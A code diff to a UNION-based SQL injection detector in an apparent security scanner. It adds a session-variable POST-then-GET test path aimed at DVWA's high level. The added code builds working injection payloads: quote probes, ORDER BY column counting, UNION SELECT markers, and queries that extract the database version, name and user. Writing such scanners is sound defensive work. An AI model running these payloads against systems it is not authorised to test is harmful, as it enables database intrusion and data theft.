@@ -1265,8 +1265,13 @@ class UnionBasedDetector:
         string_context: bool = True
     ) -> Dict:
         """Create a finding dictionary for UNION-based SQLi."""
-        finding_id = 'PYTHIA-SQL-030'
-        title = "UNION-Based SQL Injection"
+        # Sub-code 031 when injection vector is a Cookie header
+        if method == 'COOKIE':
+            finding_id = 'PYTHIA-SQL-031'
+            title = 'UNION-Based SQL Injection (Cookie)'
+        else:
+            finding_id = 'PYTHIA-SQL-030'
+            title = "UNION-Based SQL Injection"
         
         if form_context:
             description = (
@@ -1361,40 +1366,226 @@ class UnionBasedDetector:
             'references': references,
             'affected_component': f"{method} {url} (parameter: {parameter})",
             'timestamp': datetime.now(timezone.utc).isoformat(),
-            'detection_method': 'union-based'
+            'detection_method': 'union-based',
+            'parameter': parameter,
+            'vector': method,
         }
         
         return finding
     
+    # ====================================================================
+    # SESSION-VAR POST→GET CHAIN (e.g. DVWA high)
+    # ====================================================================
+    def _sv_request(self, action_url: str, parent_url: str, post_data: Dict):
+        """POST payload to action_url, then GET parent_url and return that response."""
+        try:
+            self.http.post(action_url, data=post_data)
+            return self.http.get(parent_url)
+        except Exception as e:
+            logger.debug(f"[SV] Request error: {e}")
+            return None
+
+    def _test_session_var_form(self, form: Dict, form_tester) -> List[Dict]:
+        """
+        Test session-variable form for UNION-based SQLi via POST→GET chain.
+        Used when form['action'] != form['parent_url'] (e.g. DVWA high).
+        """
+        findings = []
+        action_url = form['action']
+        parent_url = form.get('parent_url', '')
+
+        testable_inputs = form_tester.get_testable_inputs(form)
+        if not testable_inputs:
+            return findings
+
+        logger.info(
+            f"[SESSION-VAR] UNION-based POST→GET: "
+            f"POST {action_url} → GET {parent_url}"
+        )
+
+        for input_field in testable_inputs:
+            field_name = input_field['name']
+            field_value = input_field.get('value', '') or '1'
+
+            # Build base POST data from all form inputs
+            base_data: Dict[str, str] = {}
+            for inp in form.get('inputs', []):
+                if inp.get('name'):
+                    base_data[inp['name']] = inp.get('value', '') or field_value
+
+            logger.info(
+                f"  [SV] Testing field '{field_name}'={field_value} "
+                f"via POST({action_url})→GET({parent_url})"
+            )
+
+            # ----------------------------------------------------------
+            # Step 0: Verify SQL context (single quote → error OR content change)
+            # ----------------------------------------------------------
+            baseline_data = {**base_data, field_name: field_value}
+            baseline_resp = self._sv_request(action_url, parent_url, baseline_data)
+            test_data = {**base_data, field_name: f"{field_value}'"}
+            resp = self._sv_request(action_url, parent_url, test_data)
+            if not resp or not baseline_resp:
+                logger.debug(f"  [SV] Request failed for '{field_name}'")
+                continue
+            has_sql_error = self._has_sql_error(resp)
+            baseline_sz = len(baseline_resp.text)
+            resp_sz = len(resp.text)
+            diff_pct = abs(baseline_sz - resp_sz) / max(baseline_sz, 1) * 100
+            content_changed = diff_pct >= 2.0 or abs(baseline_sz - resp_sz) >= 50
+            if not has_sql_error and not content_changed:
+                logger.debug(
+                    f"  [SV] No SQL context for '{field_name}' "
+                    f"(no error, diff={abs(baseline_sz - resp_sz)}B / {diff_pct:.1f}%)"
+                )
+                continue
+            logger.info(
+                f"  [SV] SQL context confirmed for '{field_name}' "
+                f"(error={has_sql_error}, diff={abs(baseline_sz - resp_sz)}B)"
+            )
+
+            # ----------------------------------------------------------
+            # Step 1: Enumerate columns via ORDER BY
+            # Use content-change detection because apps may hide SQL errors
+            # (e.g. DVWA high shows "Something went wrong." not MySQL error text)
+            # ----------------------------------------------------------
+            num_columns = None
+            for col_count in range(1, self.max_columns + 1):
+                payload = f"{field_value}' ORDER BY {col_count}-- "
+                resp = self._sv_request(
+                    action_url, parent_url, {**base_data, field_name: payload}
+                )
+                if not resp:
+                    break
+                ob_sz = len(resp.text)
+                ob_diff_pct = abs(baseline_sz - ob_sz) / max(baseline_sz, 1) * 100
+                is_error = (
+                    self._has_sql_error(resp) or
+                    resp.status_code >= 500 or
+                    ob_diff_pct >= 5.0 or
+                    abs(baseline_sz - ob_sz) >= 80
+                )
+                if is_error:
+                    num_columns = col_count - 1
+                    break
+
+            if not num_columns:
+                logger.debug(f"  [SV] Cannot enumerate columns for '{field_name}'")
+                continue
+            logger.info(f"  [SV] Column count: {num_columns}")
+
+            # ----------------------------------------------------------
+            # Step 2: Find injectable column via markers
+            # Use id=-1 (or 0) to suppress the original row so UNION row
+            # is the only one returned even when LIMIT 1 is present.
+            # ----------------------------------------------------------
+            injectable_cols: List[int] = []
+            for col_idx in range(1, num_columns + 1):
+                marker = f"PYTHIA{random.randint(10000, 99999)}"
+                values = [
+                    f"'{marker}'" if i == col_idx else "NULL"
+                    for i in range(1, num_columns + 1)
+                ]
+                # Use -1 to get no original rows so injected row shows with LIMIT 1
+                payload = f"-1' UNION SELECT {','.join(values)}-- "
+                resp = self._sv_request(
+                    action_url, parent_url, {**base_data, field_name: payload}
+                )
+                if resp and resp.status_code == 200 and marker in resp.text:
+                    injectable_cols.append(col_idx)
+                    logger.info(f"  [SV] Injectable column {col_idx} confirmed (marker found)")
+
+            if not injectable_cols:
+                logger.warning(
+                    f"  [SV] UNION SELECT works but no markers visible — skipping '{field_name}'"
+                )
+                continue
+
+            # ----------------------------------------------------------
+            # Step 3: Extract basic info
+            # ----------------------------------------------------------
+            extracted_info: Dict[str, str] = {}
+            injectable_col = injectable_cols[0]
+            info_queries = [
+                ('@@version', 'dbms_version'),
+                ('database()', 'database_name'),
+                ('user()', 'database_user'),
+            ]
+            for query, key in info_queries:
+                values_q = [
+                    query if i == injectable_col else "NULL"
+                    for i in range(1, num_columns + 1)
+                ]
+                # Use -1 to suppress original row (same as marker step)
+                payload_q = f"-1' UNION SELECT {','.join(values_q)}-- "
+                resp_q = self._sv_request(
+                    action_url, parent_url, {**base_data, field_name: payload_q}
+                )
+                if resp_q and resp_q.status_code == 200:
+                    extracted = self._extract_from_response(resp_q.text, injectable_col)
+                    if extracted:
+                        extracted_info[key] = extracted
+                        logger.info(f"  [SV] Extracted {key}: {extracted}")
+                        break
+
+            # ----------------------------------------------------------
+            # Step 4: Create finding
+            # ----------------------------------------------------------
+            finding = self._create_finding(
+                url=parent_url,
+                parameter=field_name,
+                original_value=field_value,
+                num_columns=num_columns,
+                injectable_columns=injectable_cols,
+                extracted_info=extracted_info,
+                method=form['method'].upper(),
+                form_context=form_tester.extract_form_context(form),
+                string_context=True,
+            )
+            finding['evidence']['form_context'] = form_tester.extract_form_context(form)
+            findings.append(finding)
+            logger.info(
+                f"✓ [SESSION-VAR] UNION-based SQLi confirmed in '{field_name}' "
+                f"({num_columns} cols, injectable: {injectable_cols})"
+            )
+
+        return findings
+
     def test_form(
         self,
         form: Dict,
         form_tester
     ) -> List[Dict]:
         """Test a form for UNION-based SQLi."""
+        # Session-var: form POSTs to action but results appear at parent_url
+        parent_url = form.get('parent_url', '')
+        is_session_var = bool(parent_url and parent_url != form.get('action', ''))
+        if is_session_var:
+            return self._test_session_var_form(form, form_tester)
+
         findings = []
-        
+
         testable_inputs = form_tester.get_testable_inputs(form)
-        
+
         if not testable_inputs:
             return findings
-        
+
         logger.info(f"Testing UNION-based on form: {form['method'].upper()} {form['action']} ({len(testable_inputs)} inputs)")
-        
+
         for input_field in testable_inputs:
             field_name = input_field['name']
             field_value = input_field.get('value', '')
-            
+
             if not field_value or field_value.strip() == '':
                 field_value = '1'
                 logger.debug(f"  Field '{field_name}' has no value, using default '1'")
-            
+
             logger.debug(f"  Testing form field: {field_name}={field_value}")
-            
+
             all_form_data = {}
             for inp in form.get('inputs', []):
                 all_form_data[inp['name']] = inp.get('value', '')
-            
+
             field_findings = self.test_url_parameter(
                 base_url=form['action'],
                 param_name=field_name,
@@ -1402,16 +1593,16 @@ class UnionBasedDetector:
                 all_params=all_form_data,
                 method=form['method']
             )
-            
+
             for finding in field_findings:
                 finding['evidence']['form_context'] = form_tester.extract_form_context(form)
                 finding['description'] = finding['description'].replace(
                     "URL parameter",
                     f"form field (in {form_tester.extract_form_context(form)})"
                 )
-            
+
             findings.extend(field_findings)
-        
+
         return findings
     
     def scan(self, urls_with_params: List[Dict], forms: List[Dict]) -> List[Dict]:
